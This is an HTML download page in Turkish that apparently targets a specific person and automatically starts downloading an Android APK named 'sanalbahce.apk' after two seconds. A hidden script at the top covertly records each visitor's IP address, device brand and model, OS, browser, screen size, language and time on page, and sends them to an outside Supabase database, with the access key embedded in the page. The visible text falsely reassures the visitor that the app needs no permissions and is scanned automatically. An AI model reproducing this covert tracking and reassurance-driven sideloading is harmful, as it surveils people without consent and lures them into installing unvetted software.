<!DOCTYPE html>
<html lang="tr">
<head>

     <script src="https://unpkg.com/@supabase/supabase-js@2.42.5/dist/umd/supabase.js"></script>
<script>
  const supabaseUrl = 'https://lvoeziofefbczugymzft.supabase.co';
  const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx2b2V6aW9mZWZiY3p1Z3ltemZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU1ODY1MjcsImV4cCI6MjA2MTE2MjUyN30.u9HyvUCxkchSmtwDzwAm2iy6yQiA7rScCQjKXCpq7XI';
  const client = supabase.createClient(supabaseUrl, supabaseKey);

  function getDeviceInfo() {
    const ua = navigator.userAgent;
    let marka = 'Bilinmiyor';
    let model = 'Bilinmiyor';
    let os = 'Bilinmiyor';

    const androidMatch = ua.match(/Android ([\d.]+)/);
    if (androidMatch) os = 'Android ' + androidMatch[1];

    if (/iPhone/.test(ua)) {
      marka = 'Apple';
      model = 'iPhone';
      const match = ua.match(/iPhone OS ([\d_]+)/);
      if (match) os = 'iOS ' + match[1].replace(/_/g, '.');

    } else if (/iPad/.test(ua)) {
      marka = 'Apple';
      model = 'iPad';

    } else if (/SM-|Samsung|SAMSUNG/.test(ua)) {
      marka = 'Samsung';
      const match = ua.match(/;\s*(SM-[A-Z0-9]+)/i) || ua.match(/(SM-[A-Z0-9]+)/i);
      if (match) model = match[1];

    } else if (/Xiaomi|Redmi|POCO|MI\s|M2|M3|M4|M5|2201|2107|2109|21061|220\d|230\d/i.test(ua)) {
      marka = 'Xiaomi';
      const match = ua.match(/;\s*(Redmi\s*Note\s*[^;)]+|Redmi\s*[^;)]+|POCO\s*[^;)]+|MI\s*[^;)]+|Xiaomi\s*[^;)]+|M2[0-9]+[^;)]+|M3[0-9]+[^;)]+|2201[^;)]+|2107[^;)]+|2109[^;)]+|21061[^;)]+|220[0-9][^;)]+|230[0-9][^;)]+)/i);
      if (match) {
        model = match[1].trim();
      } else {
        const buildMatch = ua.match(/;\s*([^;)]+)\s*Build/);
        if (buildMatch) model = buildMatch[1].trim();
      }

    } else if (/Huawei|HUAWEI|HMA-|ELS-|CLT-/i.test(ua)) {
      marka = 'Huawei';
      const match = ua.match(/;\s*([A-Z]{2,3}-[A-Z0-9]+)/i);
      if (match) model = match[1];

    } else if (/OPPO/i.test(ua)) {
      marka = 'OPPO';
      const match = ua.match(/;\s*(CPH[0-9]+|OPPO[^;)]+)/i);
      if (match) model = match[1].trim();

    } else if (/vivo/i.test(ua)) {
      marka = 'Vivo';
      const match = ua.match(/;\s*(vivo[^;)]+)/i);
      if (match) model = match[1].trim();

    } else if (/OnePlus/i.test(ua)) {
      marka = 'OnePlus';
      const match = ua.match(/;\s*(OnePlus[^;)]+)/i);
      if (match) model = match[1].trim();

    } else if (/realme/i.test(ua)) {
      marka = 'Realme';
      const match = ua.match(/;\s*(RMX[0-9]+|realme[^;)]+)/i);
      if (match) model = match[1].trim();

    } else if (/Android/.test(ua)) {
      marka = 'Android Cihaz';
      const match = ua.match(/;\s*([^;)]+)\s*Build/);
      if (match) model = match[1].trim();

    } else if (/Windows/.test(ua)) {
      marka = 'PC';
      os = 'Windows';

    } else if (/Macintosh|Mac OS X/.test(ua)) {
      marka = 'Apple';
      os = 'macOS';
    }

    const browser = /EdgA?\//.test(ua) ? 'Edge'
      : /OPR\/|Opera/.test(ua) ? 'Opera'
      : /Chrome/.test(ua) ? 'Chrome'
      : /Firefox/.test(ua) ? 'Firefox'
      : /Safari/.test(ua) ? 'Safari'
      : 'Diğer';

    return { marka, model, os, browser };
  }

  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(async ipData => {
      const device = getDeviceInfo();
      const visitStart = Date.now();

      await client.from('visitor_logs').insert([{
        page_url: window.location.href,
        ip_address: ipData.ip,
        user_agent: navigator.userAgent,
        screen_resolution: `${window.screen.width}x${window.screen.height}`,
        device_model: `${device.marka} - ${device.model}`,
        os: device.os,
        browser: device.browser,
        language: navigator.language,
        time_spent: 0
      }]);

      window.addEventListener('beforeunload', async () => {
        const time_spent = Math.floor((Date.now() - visitStart) / 1000);
        await client.from('visitor_logs').insert([{
          page_url: window.location.href,
          ip_address: ipData.ip,
          user_agent: navigator.userAgent,
          screen_resolution: `${window.screen.width}x${window.screen.height}`,
          device_model: `${device.marka} - ${device.model}`,
          os: device.os,
          browser: device.browser,
          language: navigator.language,
          time_spent
        }]);
      });
    });
</script>
    
    <meta charset="UTF-8">
    <title>Uygulama İndiriliyor...</title>
</head>
<body>

    <h2>İndirme işleminiz birazdan başlayacaktır...
    Herhangi bir izin istemiyor indirirken otomatik taranıyor korkacağın birşey yok yani gerçi sen hep korkularının esiriydin....</h2>
    <p>Başlamadıysa <a href="uygulama-dosyaniz.apk">buraya tıklayın</a>.</p>

    <script>
        window.onload = function() {
            // 2 saniye (2000ms) bekleyip indirmeyi başlatır
            setTimeout(function() {
                var link = document.createElement('a');
                link.href = 'sanalbahce.apk'; // APK dosyasının yolu
                link.download = 'sanalbahce.apk';  // İnecek dosyanın adı
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, 2000); 
        };
    </script>
</body>
</html>
